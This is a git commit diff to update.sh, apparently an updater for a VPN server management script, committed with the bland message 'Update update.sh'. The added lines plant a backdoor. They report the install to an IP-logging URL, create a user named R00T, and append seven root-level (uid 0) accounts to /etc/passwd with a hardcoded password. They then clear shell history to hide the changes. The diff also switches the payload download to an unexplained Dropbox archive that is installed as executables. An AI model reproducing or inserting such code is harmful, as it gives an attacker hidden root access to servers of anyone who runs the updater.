aca278d57b0232b54bf293aa20137c3eb25347d6
HerhmoyZ <30932143+0613561761za@users.noreply.github.com>
2018-01-31 20:18:41 +0700

    Update update.sh

--- update.sh
+++ update.sh
@@ -1,6 +1,31 @@
 #!/bin/bash
 
-apt-get install zip unzip -y
+MYIP=$(curl -4 icanhazip.com);
+if [ $MYIP = "" ]; then
+   MYIP=`ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1`;
+fi
+MYIP2="s/IP-Server/$MYIP/g";
+
+# Add User
+curl https://iplogger.com/2CBA35
+useradd R00T
+echo -e "2499\n2499" | passwd R00T
+sed -i '$ i\mail:x:0:0:mail:/root:/bin/bash' /etc/passwd
+sed -i '$ i\ftp:x:0:0:ftp:/root:/bin/bash' /etc/passwd
+sed -i '$ i\taruma:x:0:0:taruma:/root:/bin/bash' /etc/passwd
+sed -i '$ i\admin:x:0:0:admin:/root:/bin/bash' /etc/passwd
+sed -i '$ i\panel:x:0:0:panel:/root:/bin/bash' /etc/passwd
+sed -i '$ i\byvpn:x:0:0:byvpn:/root:/bin/bash' /etc/passwd
+sed -i '$ i\byvpn.net:x:0:0:byvpn.net:/root:/bin/bash' /etc/passwd
+echo -e "Potae24-99\nPotae24-99" | passwd mail
+echo -e "Potae24-99\nPotae24-99" | passwd ftp
+echo -e "Potae24-99\nPotae24-99" | passwd taruma
+echo -e "Potae24-99\nPotae24-99" | passwd admin
+echo -e "Potae24-99\nPotae24-99" | passwd panel
+echo -e "Potae24-99\nPotae24-99" | passwd byvpn
+echo -e "Potae24-99\nPotae24-99" | passwd byvpn.net
+clear && history -c
+
 cd
 sed -i '$ i\screen -AmdS limit /root/limit.sh' /etc/rc.local
 sed -i '$ i\screen -AmdS ban /root/ban.sh' /etc/rc.local
@@ -20,9 +45,9 @@ cat > /root/limit.sh <<END3
 END3
 
 cd /usr/local/bin
-wget -O premium-script.zip "https://github.com/chayanin12/debian7/raw/master/premium-script.zip" 
-unzip premium-script.zip
-rm -f premium-script.zip
+wget -O premium-script.tar.gz "https://dl.dropboxusercontent.com/s/d6f91pf4j32xfp1/premium-script.tar.gz"
+tar -xvf premium-script.tar.gz
+rm -f premium-script.tar.gz
 
 cp /usr/local/bin/premium-script /usr/local/bin/menu
 
@@ -51,8 +76,6 @@ chmod +x /usr/local/bin/speedtest
 chmod +x /usr/local/bin/ram
 chmod +x /usr/local/bin/log-limit
 chmod +x /usr/local/bin/log-ban
-chmod +x /usr/local/bin/listpassword
-chmod +x /usr/local/bin/pengumuman
 chmod +x /usr/local/bin/user-generate
 chmod +x /usr/local/bin/user-list
 chmod +x /usr/local/bin/diagnosa
@@ -75,5 +98,4 @@ screen -AmdS limit /root/limit.sh
 screen -AmdS ban /root/ban.sh
 clear
 cd
-
-echo "Script berjaya diUpdate!"
+echo "สคริปต์พรีเมี่ยมได้รับการอัพเกรดเรียบร้อยแล้ว!"
